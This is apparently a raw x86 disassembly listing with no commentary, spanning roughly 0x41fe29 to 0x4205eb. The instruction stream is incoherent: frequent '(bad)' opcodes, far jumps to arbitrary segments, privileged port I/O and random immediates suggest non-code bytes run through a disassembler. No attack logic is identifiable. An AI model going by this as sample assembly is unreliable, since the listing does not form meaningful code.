  41fe29:	call   0xa5ad0388
  41fe2e:	mov    ebx,DWORD PTR [esi+0x4f]
  41fe31:	xchg   BYTE PTR [eax-0xe],dl
  41fe34:	push   es
  41fe35:	retf   
  41fe36:	mov    ebp,DWORD PTR [edi]
  41fe38:	loop   0x41fe83
  41fe3a:	xchg   DWORD PTR [ebp+0x3e],eax
  41fe3d:	fld    TBYTE PTR [esi+eax*8+0x64]
  41fe41:	enter  0xfa,0x17
  41fe45:	and    dh,bl
  41fe47:	arpl   WORD PTR [eax+0x78],dx
  41fe4a:	les    eax,FWORD PTR gs:[edi]
  41fe4d:	pop    ebx
  41fe4e:	shl    BYTE PTR [eax-0x433ed0a9],1
  41fe54:	or     ah,al
  41fe56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe57:	pop    eax
  41fe58:	ds inc eax
  41fe5a:	clc    
  41fe5b:	or     ebp,DWORD PTR [ebp+0x7f]
  41fe5e:	pop    esi
  41fe5f:	and    BYTE PTR [ebp+edi*4+0x40],0x76
  41fe64:	pop    es
  41fe65:	mov    edi,DWORD PTR gs:[esi+0x23]
  41fe69:	adc    ebx,esi
  41fe6b:	stos   DWORD PTR es:[edi],eax
  41fe6c:	arpl   WORD PTR [edx+esi*8+0xc],dx
  41fe70:	mov    dl,0x16
  41fe72:	push   ss
  41fe73:	dec    ecx
  41fe74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe75:	outs   dx,DWORD PTR ds:[esi]
  41fe76:	dec    esp
  41fe77:	das    
  41fe78:	test   BYTE PTR [edx],0x94
  41fe7b:	mov    ebp,0xd919bead
  41fe80:	mov    es,WORD PTR [ebp+0x3a049072]
  41fe86:	lea    esi,[edx+ebp*4-0x64b67f26]
  41fe8d:	xor    BYTE PTR [ebx+0x9],0x51
  41fe91:	mov    ds:0x7af6686d,al
  41fe96:	iret   
  41fe97:	inc    ecx
  41fe98:	sbb    eax,0x391093f2
  41fe9d:	push   0xffffffd1
  41fe9f:	jmp    0x5945:0xb78466ef
  41fea6:	sbb    eax,0x42a23d9
  41feab:	popf   
  41feac:	cmp    eax,esi
  41feae:	xchg   dh,ch
  41feb0:	push   ecx
  41feb1:	jmp    0xca42:0x435c64dd
  41feb8:	in     eax,dx
  41feb9:	push   eax
  41feba:	inc    ebp
  41febb:	push   0x85c0328a
  41fec0:	cli    
  41fec1:	jne    0x41ff15
  41fec3:	push   edx
  41fec4:	inc    ebx
  41fec5:	and    eax,0xf2c2ad50
  41feca:	push   eax
  41fecb:	lea    edi,ss:[ebp-0x25]
  41fecf:	mov    WORD PTR [edx+ebp*1],fs
  41fed2:	mov    dh,BYTE PTR [edi+edi*1]
  41fed5:	and    eax,0xc43068a4
  41feda:	cmp    BYTE PTR [eax-0x2c],0x48
  41fede:	std    
  41fedf:	and    DWORD PTR [esi+0x54],esp
  41fee2:	lds    edx,FWORD PTR [ecx]
  41fee4:	cmp    ebx,ebx
  41fee6:	xchg   ebx,eax
  41fee7:	rcr    BYTE PTR [edi+eiz*2+0x4d],cl
  41feeb:	out    dx,al
  41feec:	adc    esp,ebp
  41feee:	sub    al,0x68
  41fef0:	sbb    edi,ebp
  41fef2:	pop    ss
  41fef3:	cmp    ebp,DWORD PTR [edx]
  41fef5:	cmp    edi,eax
  41fef7:	retf   
  41fef8:	ficomp WORD PTR [edx-0x12b0dbda]
  41fefe:	out    0x8b,eax
  41ff00:	(bad)  
  41ff01:	aaa    
  41ff02:	adc    esi,DWORD PTR [edi-0x40]
  41ff05:	push   cs
  41ff06:	pop    ebx
  41ff07:	sti    
  41ff08:	and    ebp,eax
  41ff0a:	test   al,0xcc
  41ff0c:	dec    edi
  41ff0d:	retf   
  41ff0e:	ins    BYTE PTR es:[edi],dx
  41ff0f:	outs   dx,DWORD PTR ds:[esi]
  41ff10:	or     ah,BYTE PTR [ecx-0x6a5d17fd]
  41ff16:	mov    ds:0xf1a337d3,eax
  41ff1b:	mov    cs,edi
  41ff1d:	test   eax,0x21b88bd6
  41ff22:	mov    dl,0x53
  41ff24:	mov    es,ebp
  41ff26:	fdiv   QWORD PTR [edi]
  41ff28:	fucomp st(5)
  41ff2a:	aaa    
  41ff2b:	push   cs
  41ff2c:	jbe    0x41ff22
  41ff2e:	repz call 0xbf6a:0x4f9433a3
  41ff36:	and    al,0xa9
  41ff38:	int3   
  41ff39:	xchg   esp,eax
  41ff3a:	les    ebp,FWORD PTR [ebx-0x7c]
  41ff3d:	leave  
  41ff3e:	mov    bl,0xf9
  41ff40:	ins    BYTE PTR es:[edi],dx
  41ff41:	hlt    
  41ff42:	mov    ebp,DWORD PTR [esi-0x7f]
  41ff45:	pop    eax
  41ff46:	stc    
  41ff47:	or     eax,DWORD PTR [ebx]
  41ff49:	jb     0x41ff0f
  41ff4b:	sbb    eax,0x87018f12
  41ff50:	sahf   
  41ff51:	or     dh,dh
  41ff53:	ret    0xe1bf
  41ff56:	mov    bl,0x20
  41ff58:	fdiv   DWORD PTR [eax]
  41ff5a:	outs   dx,BYTE PTR ds:[esi]
  41ff5b:	enter  0xd40f,0x9e
  41ff5f:	inc    esi
  41ff60:	push   eax
  41ff61:	push   ebp
  41ff62:	mov    edx,0xb7fa1a29
  41ff68:	pop    esi
  41ff69:	jbe    0x41ff1f
  41ff6b:	pop    esi
  41ff6c:	push   esi
  41ff6d:	sbb    al,0x2
  41ff6f:	popa   
  41ff70:	dec    esp
  41ff71:	dec    edi
  41ff72:	cli    
  41ff73:	jl     0x41ffaf
  41ff75:	mov    al,ds:0x67bf387d
  41ff7a:	push   ebp
  41ff7b:	and    eax,0xd8bb9b22
  41ff80:	iret   
  41ff81:	out    0xe1,eax
  41ff83:	rcr    DWORD PTR [eax],1
  41ff85:	inc    edi
  41ff86:	cmp    al,0xcb
  41ff88:	ins    DWORD PTR es:[edi],dx
  41ff89:	mov    ecx,0x9832a38a
  41ff8e:	mov    cl,0xe7
  41ff90:	pop    edx
  41ff91:	push   es
  41ff92:	mov    dl,BYTE PTR [ebx-0x6d]
  41ff95:	xor    DWORD PTR [edi+ebx*4-0x68],0x304dce9a
  41ff9d:	mov    ds:0xaad7a284,eax
  41ffa2:	pop    ecx
  41ffa3:	xor    DWORD PTR [edx-0x3b],0x78b04b62
  41ffaa:	out    dx,eax
  41ffab:	mov    ebx,0xcea5bfbf
  41ffb0:	jl     0x41ffd7
  41ffb2:	cwde   
  41ffb3:	pop    ss
  41ffb4:	das    
  41ffb5:	mov    esp,0x8928d316
  41ffba:	sbb    ch,BYTE PTR [edi-0x2aaf9cbe]
  41ffc0:	ins    DWORD PTR es:[edi],dx
  41ffc1:	shl    BYTE PTR ds:0x434b8c13,0x96
  41ffc8:	mov    bh,BYTE PTR [esi-0x1f]
  41ffcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffcc:	sti    
  41ffcd:	test   eax,0xf75e4ad7
  41ffd2:	jae    0x41ffc1
  41ffd4:	scas   eax,DWORD PTR es:[edi]
  41ffd5:	repz pop esi
  41ffd7:	enter  0x8d2a,0x22
  41ffdb:	in     al,0x3a
  41ffdd:	inc    esp
  41ffde:	mov    dl,cl
  41ffe0:	imul   eax,DWORD PTR [ebp+0x1f],0xffffff89
  41ffe4:	mov    esp,DWORD PTR [eax]
  41ffe6:	mov    dl,0xd5
  41ffe8:	arpl   WORD PTR [ebp+0x1c447072],di
  41ffee:	mov    ds:0xeb161ab4,eax
  41fff3:	in     eax,dx
  41fff4:	push   0x33ddcf24
  41fff9:	pop    eax
  41fffa:	or     BYTE PTR [edi-0x53],cl
  41fffd:	sbb    al,0xa4
  41ffff:	adc    al,BYTE PTR ds:0xf6d75658
  420005:	call   0xdc480de1
  42000a:	mov    esi,0x9708425b
  42000f:	shl    DWORD PTR cs:[esp+ebp*2],1
  420013:	xor    edx,esi
  420015:	push   es
  420016:	xchg   ebx,eax
  420017:	(bad)
  42001a:	fnstcw WORD PTR [edi-0x49e057db]
  420020:	or     ah,BYTE PTR [ecx]
  420022:	stos   DWORD PTR es:[edi],eax
  420023:	cmp    DWORD PTR [ebx],ebx
  420025:	cmp    bh,BYTE PTR [edx-0x22577b1b]
  42002b:	sti    
  42002c:	cmp    esi,DWORD PTR [edx+0x4d50ab50]
  420032:	push   ss
  420033:	mov    edi,0xd426f5b1
  420038:	ja     0x420035
  42003a:	xchg   ecx,eax
  42003b:	inc    eax
  42003c:	aaa    
  42003d:	bound  ecx,QWORD PTR [edi+0x6f4817e5]
  420043:	dec    ebx
  420044:	xor    DWORD PTR [esi-0x29e412c0],ebp
  42004a:	xor    BYTE PTR [edi+0x26],al
  42004d:	push   ds
  42004e:	push   ebx
  42004f:	das    
  420050:	mov    dh,0xea
  420052:	rol    DWORD PTR [ebx],1
  420054:	icebp  
  420055:	and    eax,0xb697ff1d
  42005a:	push   edx
  42005b:	aam    0x23
  42005d:	push   esi
  42005e:	call   0x3916:0xaeb66535
  420065:	xchg   DWORD PTR [ebx],edx
  420067:	cli    
  420068:	adc    eax,ebx
  42006a:	pop    ss
  42006b:	push   ecx
  42006c:	(bad)  
  42006d:	out    0xe4,al
  42006f:	pop    ebp
  420070:	pop    ecx
  420071:	test   BYTE PTR ds:0x1b46b47f,bh
  420077:	mov    dh,0xf2
  420079:	in     al,dx
  42007a:	add    DWORD PTR [edi-0x4e4b0e8d],esp
  420080:	fild   DWORD PTR [ebp-0x17b80dbd]
  420086:	push   0xffffffd9
  420088:	xchg   ebp,eax
  420089:	xor    eax,0x3aa87384
  42008e:	or     al,0xbf
  420090:	(bad)  
  420091:	pop    ss
  420092:	mov    WORD PTR ss:[ebp-0x1462d28c],?
  420099:	mov    ebx,DWORD PTR [edi+edx*4-0x43]
  42009d:	pop    esp
  42009e:	(bad)  
  42009f:	shl    DWORD PTR [esi+eiz*1-0x5bf26039],0x19
  4200a7:	imul   ebp,DWORD PTR [edx+ecx*8],0xb8ac68a8
  4200ae:	cld    
  4200af:	call   0x5f23:0x77615eb2
  4200b6:	push   eax
  4200b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b8:	jns    0x42003c
  4200ba:	mov    esi,0x1ddef928
  4200bf:	jle    0x420056
  4200c1:	or     DWORD PTR [ebp+0x751cac97],ebp
  4200c7:	lahf   
  4200c8:	push   es
  4200c9:	repnz inc edx
  4200cb:	or     edi,DWORD PTR [edi+0x19]
  4200ce:	sbb    dh,bl
  4200d0:	push   es
  4200d1:	inc    esp
  4200d2:	pop    ss
  4200d3:	inc    BYTE PTR [ecx]
  4200d5:	mov    edi,0xabf1e026
  4200da:	add    edi,DWORD PTR [edi+0x5cc86015]
  4200e0:	cli    
  4200e1:	push   ds
  4200e2:	push   ecx
  4200e3:	in     al,0xdd
  4200e5:	and    al,0x9
  4200e7:	mov    dh,0x4f
  4200e9:	dec    esp
  4200ea:	retf   
  4200eb:	mov    edi,0xbd256637
  4200f0:	xchg   esi,eax
  4200f1:	and    cl,BYTE PTR [edx+0x30b4eda5]
  4200f7:	(bad)  
  4200f8:	jecxz  0x420145
  4200fa:	xchg   esp,eax
  4200fb:	out    dx,al
  4200fc:	jmp    0x5cf3aff6
  420101:	mov    ds:0xad4df05c,eax
  420106:	bound  esi,QWORD PTR [ebx-0x79]
  420109:	add    BYTE PTR [ecx+0x7a],cl
  42010c:	jp     0x4200ce
  42010e:	mov    esi,DWORD PTR [edi+0x431470d4]
  420114:	sub    al,0xd5
  420116:	pop    ecx
  420117:	sub    DWORD PTR [edi+0x700a3650],ecx
  42011d:	jmp    0x9d83:0xc2de1a4f
  420124:	jno    0x4200b3
  420126:	rcl    DWORD PTR [esi-0x340a8932],cl
  42012c:	push   edx
  42012d:	xor    ebp,DWORD PTR [ecx+0x18]
  420130:	lods   eax,DWORD PTR ds:[esi]
  420131:	aad    0x88
  420133:	mov    bl,0xfe
  420135:	loopne 0x420157
  420137:	mov    al,0x1c
  420139:	(bad)
  42013c:	mov    eax,0x67f2e141
  420141:	or     eax,ecx
  420143:	and    DWORD PTR ds:0x57a17559,0xffffffba
  42014a:	mov    ebp,0xe94412a0
  42014f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420150:	jge    0x420115
  420152:	stos   DWORD PTR es:[edi],eax
  420153:	stc    
  420154:	into   
  420155:	jmp    0x18b6b8fd
  42015a:	xchg   edi,eax
  42015b:	adc    DWORD PTR [edx-0x66],ebx
  42015e:	push   edx
  42015f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420160:	pop    ss
  420161:	sub    BYTE PTR [ecx+ebx*2-0x1d672558],ch
  420168:	xchg   dl,bl
  42016a:	es (bad) 
  42016c:	xlat   BYTE PTR ds:[ebx]
  42016d:	hlt    
  42016e:	(bad)
  420171:	pop    esi
  420172:	into   
  420173:	mov    ds:0x65604746,al
  420178:	xchg   edi,eax
  420179:	lods   eax,DWORD PTR ds:[esi]
  42017a:	out    dx,eax
  42017b:	test   cl,cl
  42017d:	mov    dl,0x18
  42017f:	xor    al,0xe8
  420181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420182:	stc    
  420183:	loope  0x420113
  420185:	or     eax,DWORD PTR [esi+0x59fd25e3]
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x26],esi
  420197:	pop    esi
  420198:	or     eax,0x190e82f
  42019d:	add    BYTE PTR [eax+0x1c000006],cl
  4201a3:	cwde   
  4201a4:	mov    eax,0x9c3e2124
  4201a9:	jmp    0x5d83fa81
  4201ae:	xor    cl,BYTE PTR [ebx-0xc151654]
  4201b4:	pop    ebx
  4201b5:	sbb    eax,0xbbd324e0
  4201ba:	sub    ebx,DWORD PTR [esi]
  4201bc:	popa   
  4201bd:	lods   eax,DWORD PTR ds:[esi]
  4201be:	xchg   esi,eax
  4201bf:	push   ecx
  4201c0:	xchg   ecx,eax
  4201c1:	gs out 0xb3,al
  4201c4:	jle    0x420152
  4201c6:	jb     0x42021e
  4201c8:	loop   0x4201f2
  4201ca:	sub    eax,0x27e43361
  4201cf:	mov    ebx,0x62899055
  4201d4:	xchg   ecx,eax
  4201d5:	sbb    eax,DWORD PTR [esi+ebx*2+0x23]
  4201d9:	mov    ebx,ebx
  4201db:	xor    al,0x1d
  4201dd:	dec    ebp
  4201de:	punpckhbw mm1,QWORD PTR [ebp-0x9]
  4201e2:	loop   0x4201a8
  4201e4:	fild   WORD PTR [ebx]
  4201e6:	fnsave gs:[edx+0x6d]
  4201ea:	ds jae 0x42017d
  4201ed:	call   0x4b4edf50
  4201f2:	daa    
  4201f3:	rol    DWORD PTR [ebx+ecx*4+0x3967eb4],cl
  4201fa:	mov    ?,WORD PTR [ecx-0x79]
  4201fd:	jge    0x4201f4
  4201ff:	dec    esp
  420200:	xchg   BYTE PTR [eax],ah
  420202:	daa    
  420203:	or     edi,edi
  420205:	or     BYTE PTR [edi+0x4c5be71c],al
  42020b:	adc    al,0x97
  42020d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42020e:	pop    ebp
  420210:	mov    BYTE PTR [esi+0x25],cl
  420213:	sbb    BYTE PTR [edi+esi*1+0x39e57d76],bh
  42021a:	fbstp  TBYTE PTR [esi]
  42021c:	repnz cwde 
  42021e:	sbb    eax,0x3dd8164c
  420223:	rcr    DWORD PTR [ecx],0x64
  420226:	clc    
  420227:	call   0x34c3:0xc16913bf
  42022e:	retf   0xf363
  420231:	cmp    eax,0xc3581fa5
  420236:	push   esp
  420237:	push   es
  420238:	out    0x4f,eax
  42023a:	stos   BYTE PTR es:[edi],al
  42023b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42023c:	je     0x4201f5
  42023e:	sti    
  42023f:	mov    cs,WORD PTR ds:0x134b664f
  420245:	fld    DWORD PTR ds:0x54459cec
  42024b:	mov    dh,dl
  42024d:	leave  
  42024e:	push   edi
  42024f:	test   DWORD PTR [esi-0x30],ebx
  420252:	shl    ah,cl
  420254:	mov    ch,0x1a
  420256:	in     al,dx
  420257:	ss dec ebx
  420259:	jne    0x42029d
  42025b:	inc    ebx
  42025c:	ds out dx,eax
  42025e:	mov    ebp,0x4392c35b
  420263:	adc    BYTE PTR [ecx],ch
  420265:	dec    edi
  420266:	dec    ebx
  420267:	fadd   QWORD PTR [esi+esi*8+0x5e]
  42026b:	shl    BYTE PTR ds:0xdda61f0a,1
  420271:	(bad)  
  420273:	data16 mov bh,0x5c
  420276:	and    BYTE PTR [eax-0x7],ah
  420279:	sbb    BYTE PTR [edx],dh
  42027b:	and    cl,cl
  42027d:	add    ah,BYTE PTR [edi+0x6c]
  420280:	and    BYTE PTR [edx+ebp*4+0x5b],al
  420284:	dec    eax
  420285:	scas   al,BYTE PTR es:[edi]
  420286:	inc    ebp
  420287:	or     cl,BYTE PTR [edx+0x5b]
  42028a:	sahf   
  42028b:	push   es
  42028c:	sar    BYTE PTR [esi-0x22dd5c62],0x9b
  420293:	mov    esp,0x134a85c6
  420298:	ds imul ecx,DWORD PTR ss:[eax+0x1b20bf06],0x7818670a
  4202a4:	loope  0x420299
  4202a6:	test   BYTE PTR [ecx+edx*1+0x5],cl
  4202aa:	cmc    
  4202ab:	mov    bl,0xd6
  4202ad:	fdivr  DWORD PTR [ebp+0x66]
  4202b0:	inc    ebx
  4202b1:	sub    esp,DWORD PTR [eax]
  4202b3:	mov    dl,0x1a
  4202b5:	scas   eax,DWORD PTR es:[edi]
  4202b6:	xor    bl,bl
  4202b8:	rcr    DWORD PTR fs:[ebp-0x4e5c9aa9],0x89
  4202c0:	or     BYTE PTR [ebp+0x6f7ab7ca],bh
  4202c6:	xchg   ebx,eax
  4202c7:	pop    ds
  4202c8:	or     BYTE PTR [esi+0x49],0x74
  4202cc:	and    al,0x5b
  4202ce:	jmp    0x63bf6759
  4202d3:	sahf   
  4202d4:	test   BYTE PTR [edx],al
  4202d6:	rcl    DWORD PTR [esi-0x1d9e5184],1
  4202dc:	and    DWORD PTR [ecx+0xc96af11],ecx
  4202e2:	int3   
  4202e3:	call   0x4255:0x2ea2bd75
  4202ea:	xor    ah,BYTE PTR [ecx]
  4202ec:	ror    DWORD PTR [edx+0x7e],1
  4202ef:	mov    bl,0x8d
  4202f1:	inc    edi
  4202f2:	push   esp
  4202f3:	inc    ebx
  4202f4:	(bad)  
  4202f5:	xchg   ebp,eax
  4202f6:	pop    ds
  4202f7:	fstp   TBYTE PTR [esi-0x647c1106]
  4202fd:	pop    ss
  4202fe:	sbb    BYTE PTR [eax+esi*2],cl
  420301:	aas    
  420302:	lahf   
  420303:	stos   BYTE PTR es:[edi],al
  420304:	mov    WORD PTR [edi+0x125f6b36],?
  42030a:	sub    eax,DWORD PTR [ecx-0x60dd8e88]
  420310:	(bad)  
  420311:	mov    ebp,0xb4b6476b
  420316:	ret    0x988e
  420319:	loopne 0x42030c
  42031b:	leave  
  42031c:	stos   DWORD PTR es:[edi],eax
  42031d:	cwde   
  42031e:	aaa    
  42031f:	cs cld 
  420321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420322:	ret    
  420323:	not    BYTE PTR [edi]
  420325:	and    al,0x45
  420327:	(bad)  
  420328:	pop    edx
  420329:	cmp    eax,0xe225f888
  42032e:	out    0x3a,al
  420330:	daa    
  420331:	sub    esp,DWORD PTR [ecx+0x45]
  420334:	mov    ebx,0x1faa674e
  420339:	cmp    cl,al
  42033b:	pop    esi
  42033c:	fbld   TBYTE PTR [edx]
  42033e:	xor    ebx,DWORD PTR [ebx+0xc]
  420341:	mov    ebp,0x37fb0c6a
  420346:	fstp   DWORD PTR [edx-0xf455861]
  42034c:	test   BYTE PTR [ebx-0x40],ch
  42034f:	repnz outs dx,BYTE PTR ds:[esi]
  420351:	jae    0x4202fe
  420353:	cmp    DWORD PTR [edx],ebp
  420355:	mov    ebx,0x76c76588
  42035a:	jg     0x420340
  42035c:	out    dx,eax
  42035d:	xor    DWORD PTR [edx-0x5e],0x8e951dd7
  420364:	push   edi
  420365:	imul   ebx,DWORD PTR [eax-0xb486c7],0xffb9b563
  42036f:	popa   
  420370:	cmp    al,0x95
  420372:	icebp  
  420373:	sbb    eax,0x6fcafef0
  420378:	int    0xce
  42037a:	fidiv  WORD PTR [edi-0x18]
  42037d:	inc    ecx
  42037e:	clc    
  42037f:	rcl    DWORD PTR [eax+0x4d015a11],1
  420385:	sub    eax,DWORD PTR [ebp+0x3e]
  420388:	jne    0x42034c
  42038a:	xchg   DWORD PTR [esi-0x39df188a],esi
  420390:	cmp    DWORD PTR [ebx+0x23],edi
  420393:	or     ch,BYTE PTR [ebx]
  420395:	daa    
  420396:	sbb    eax,0xab8fa3b4
  42039b:	add    al,0x69
  42039d:	cli    
  42039e:	loope  0x42033c
  4203a0:	inc    edx
  4203a1:	mov    eax,0x6a86c21b
  4203a6:	mov    al,ds:0x148ded40
  4203ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203ac:	sar    BYTE PTR [edi+0x60],cl
  4203af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203b0:	pushf  
  4203b1:	out    dx,eax
  4203b2:	pop    esi
  4203b3:	cmp    edx,DWORD PTR [eax]
  4203b5:	popf   
  4203b6:	and    eax,DWORD PTR [eax]
  4203b8:	jb     0x4203e6
  4203ba:	cdq    
  4203bb:	(bad)  
  4203bc:	cwde   
  4203bd:	popa   
  4203be:	pop    eax
  4203bf:	cmp    esi,ebp
  4203c1:	test   DWORD PTR [esi-0x411550e6],eax
  4203c7:	out    0xa6,eax
  4203c9:	test   DWORD PTR [ebx+0x783f8edc],ecx
  4203cf:	lods   al,BYTE PTR ds:[esi]
  4203d0:	push   ebx
  4203d1:	mov    eax,ds:0x8787db06
  4203d6:	mov    ds:0x1dc8e151,eax
  4203db:	std    
  4203dc:	std    
  4203dd:	or     ah,BYTE PTR [edi]
  4203df:	dec    edi
  4203e0:	inc    edx
  4203e1:	mov    es:0xd12d650a,eax
  4203e7:	cmp    WORD PTR [esp+0x66ab13e9],bx
  4203ef:	addr16 or al,0xc9
  4203f2:	jo     0x42040d
  4203f4:	push   edi
  4203f5:	sub    BYTE PTR [edi+0x2e3e00],ch
  4203fb:	ficomp WORD PTR [ebx]
  4203fd:	xor    eax,0xf7f33a55
  420402:	(bad)  
  420403:	(bad)  
  420404:	cwde   
  420405:	mov    ds:0x327445ea,eax
  42040a:	aaa    
  42040b:	ret    
  42040c:	std    
  42040d:	mov    dh,0x2b
  42040f:	mov    ah,0xb1
  420411:	popf   
  420412:	xor    ecx,eax
  420414:	ins    BYTE PTR es:[edi],dx
  420415:	inc    edx
  420416:	iret   
  420417:	or     BYTE PTR [esi+eiz*1-0x16354a58],ch
  42041e:	jp     0x420492
  420420:	add    esi,DWORD PTR [ebx+0x6941d8f2]
  420426:	dec    edx
  420427:	adc    edi,DWORD PTR [ecx+eiz*4-0x2c]
  42042b:	sbb    ah,BYTE PTR [edi-0x3516d314]
  420431:	je     0x4203d5
  420433:	jmp    0x2eba:0xf95493f1
  42043a:	mov    dh,0x68
  42043c:	push   esp
  42043d:	add    esp,DWORD PTR [ecx+0x2faa1a2c]
  420443:	pop    edi
  420444:	imul   eax,DWORD PTR [edx-0x28],0xd95e55a7
  42044b:	test   eax,0xdf7a6d6e
  420450:	inc    edi
  420451:	hlt    
  420452:	mov    BYTE PTR [eax+0x0],al
  420455:	jl     0x4203ff
  420457:	aad    0xbd
  420459:	mov    eax,ds:0x78e8a7ad
  42045e:	add    edi,esi
  420460:	imul   edi,DWORD PTR [eax],0x3c7c6338
  420466:	ja     0x420479
  420468:	xor    esp,DWORD PTR [edi+ebp*8]
  42046b:	rcr    esp,1
  42046d:	xor    eax,0x1d65d0e8
  420472:	in     eax,0x87
  420474:	stos   DWORD PTR es:[edi],eax
  420475:	sahf   
  420476:	fwait
  420477:	adc    eax,0x22979591
  42047c:	mov    eax,ds:0x111202e2
  420481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420482:	call   0x910:0x3f64ff95
  420489:	rcr    ebx,0xed
  42048c:	aad    0x4b
  42048e:	in     eax,0x6d
  420490:	fxch   st(6)
  420492:	sub    eax,0x57bdf661
  420497:	dec    ecx
  420498:	push   edi
  420499:	xchg   BYTE PTR [eax],bl
  42049b:	xchg   BYTE PTR [edi],dh
  42049d:	outs   dx,DWORD PTR ds:[esi]
  42049e:	or     BYTE PTR [ecx+0x57cfe683],al
  4204a4:	mov    esi,0xce441d26
  4204a9:	stos   DWORD PTR es:[edi],eax
  4204aa:	pop    esp
  4204ab:	enter  0xe504,0x20
  4204af:	add    edx,ecx
  4204b1:	mov    esp,0x81ccee75
  4204b6:	mov    dh,0x20
  4204b8:	jo     0x4204c6
  4204ba:	pop    edi
  4204bb:	das    
  4204bc:	stos   BYTE PTR es:[edi],al
  4204bd:	shr    BYTE PTR [edx],cl
  4204bf:	push   ss
  4204c0:	mov    WORD PTR [ebp+0x7d],?
  4204c3:	jno    0x42050d
  4204c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204c6:	push   edx
  4204c7:	les    edx,FWORD PTR [ebp-0x2ff8f056]
  4204cd:	(bad)  
  4204ce:	push   esi
  4204cf:	jb     0x420499
  4204d1:	int    0x8b
  4204d3:	xchg   esi,eax
  4204d5:	mov    cl,0x38
  4204d7:	add    al,BYTE PTR [esi+0x65]
  4204da:	pusha  
  4204db:	cmp    eax,0x71bc2557
  4204e0:	or     BYTE PTR [edi+0xd],ch
  4204e3:	lea    ebx,[esi+0x31]
  4204e6:	jle    0x4204d6
  4204e8:	xchg   DWORD PTR gs:0x67c17152,edi
  4204ef:	mov    ecx,0x14b9317c
  4204f4:	jge    0x4204a0
  4204f6:	das    
  4204f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204f8:	mov    gs,WORD PTR [edi-0x48]
  4204fb:	mov    dl,0x56
  4204fd:	xchg   BYTE PTR [edx],ah
  4204ff:	loope  0x4204e8
  420501:	mov    al,ds:0xf125f696
  420506:	push   ss
  420507:	xor    BYTE PTR [edi-0x2288a801],0x98
  42050e:	cmp    edi,eax
  420510:	retf   0x5a70
  420513:	ss dec ebp
  420515:	sub    al,0x80
  420517:	dec    ecx
  420518:	jbe    0x4204df
  42051a:	xlat   BYTE PTR ds:[ebx]
  42051b:	mov    ds:0xc1623663,eax
  420520:	fcomp  QWORD PTR [esi+0x2867f628]
  420526:	inc    ebp
  420527:	mov    al,0x6c
  420529:	push   esi
  42052a:	xor    BYTE PTR [ebp-0x67],bh
  42052d:	aad    0x92
  42052f:	ins    DWORD PTR es:[edi],dx
  420530:	clc    
  420531:	out    0x19,eax
  420533:	dec    ebx
  420534:	add    DWORD PTR [edi+0x12],0x8fe0f12d
  42053b:	test   al,0xff
  42053d:	lea    edi,[edx-0x7]
  420540:	dec    DWORD PTR [edi]
  420542:	icebp  
  420543:	xchg   ebx,eax
  420544:	(bad)
  420548:	cmp    DWORD PTR [ecx],esp
  42054a:	fimul  WORD PTR [ebp-0x34]
  42054d:	out    dx,al
  42054e:	sub    eax,0x50ac6e3c
  420553:	mov    bl,BYTE PTR [edx]
  420555:	mov    DWORD PTR [edx],ebp
  420557:	xchg   edx,eax
  420558:	loop   0x420566
  42055a:	clc    
  42055b:	mov    dh,0xd1
  42055d:	adc    esp,ebx
  42055f:	in     al,0x8e
  420561:	pop    ss
  420562:	call   0xbc98:0xb3cdb988
  420569:	pop    esp
  42056a:	mov    ch,0x70
  42056c:	aaa    
  42056d:	shl    BYTE PTR [eax],1
  42056f:	push   ecx
  420570:	idiv   DWORD PTR [esi+0x5cdc975a]
  420576:	jno    0x4205ee
  420578:	and    eax,0x51b68986
  42057d:	pop    ebx
  42057e:	cdq    
  42057f:	sbb    bh,BYTE PTR ds:0x4893ca8a
  420585:	jbe    0x4205bb
  420587:	cmp    bh,BYTE PTR [ecx-0x35]
  42058a:	dec    eax
  42058b:	sub    al,BYTE PTR [ebx]
  42058d:	mov    dh,BYTE PTR [esp+ebp*4-0x7ebe2dc1]
  420594:	ja     0x420539
  420596:	push   esi
  420597:	and    DWORD PTR [edx+0x15],esp
  42059a:	leave  
  42059b:	inc    esp
  42059c:	scas   al,BYTE PTR es:[edi]
  42059d:	cwde   
  42059e:	add    esi,DWORD PTR [eax+0x42145a9d]
  4205a4:	push   esp
  4205a5:	push   ebx
  4205a6:	and    ch,BYTE PTR [esi]
  4205a8:	rcl    DWORD PTR [edx+0xd],1
  4205ab:	loop   0x4205ea
  4205ad:	inc    WORD PTR [ebx]
  4205b0:	outs   dx,DWORD PTR ds:[esi]
  4205b1:	scas   eax,DWORD PTR es:[edi]
  4205b2:	addr16 (bad) 
  4205b4:	ss enter 0xb765,0xfb
  4205b9:	or     BYTE PTR ds:0x61aec581,0x42
  4205c0:	jecxz  0x4205bf
  4205c2:	mov    edx,0x243b71ef
  4205c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205c8:	lods   eax,DWORD PTR ds:[esi]
  4205c9:	mov    al,ds:0x8bf230f1
  4205ce:	scas   eax,DWORD PTR es:[edi]
  4205cf:	jns    0x420606
  4205d1:	ret    
  4205d2:	lahf   
  4205d3:	mov    al,0xb9
  4205d5:	aas    
  4205d6:	in     al,0x63
  4205d8:	mov    fs,WORD PTR [edx-0x27]
  4205db:	sbb    eax,0xab7a65e9
  4205e0:	out    dx,al
  4205e1:	pop    eax
  4205e2:	clc    
  4205e3:	shl    DWORD PTR [esi],0x13
  4205e6:	add    esi,edi
  4205e8:	shl    bl,0x60
  4205eb:	jae    0x420591
